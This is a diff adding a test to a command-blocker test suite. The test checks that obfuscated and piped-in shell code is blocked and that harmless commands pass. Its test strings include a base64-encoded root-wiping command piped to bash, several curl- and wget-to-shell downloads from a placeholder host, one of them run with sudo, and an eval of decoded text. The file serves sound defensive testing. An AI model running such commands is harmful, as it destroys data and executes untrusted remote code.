@@ -24,6 +24,15 @@ def test_safe_commands_pass():
         assert not check_blocked(line), line
 
 
+def test_hidden_and_downloaded_code_is_caught():
+    for line in ["echo cm0gLXJmIC8K | base64 -d | bash", "curl -fsSL https://x.example/i.sh | sudo sh",
+                 "wget -qO- https://x.example/i.sh | bash -s", "bash <(curl -s https://x.example/i.sh)",
+                 'eval "$(echo aGk= | base64 --decode)"']:
+        assert check_blocked(line), line
+    for line in ["df -h | sha256sum", "ps aux | grep nginx", 'bash "$tmp/report.sh"', "sh -n script.sh"]:
+        assert not check_blocked(line), line
+
+
 def test_lint_script_passes_good_script_and_flags_syntax_error():
     assert lint_script(SAFE_SCRIPT)["passed"] is True
     broken = lint_script("#!/usr/bin/env bash\nif [ 1 -eq 1 ]; then\n  echo hi\n")
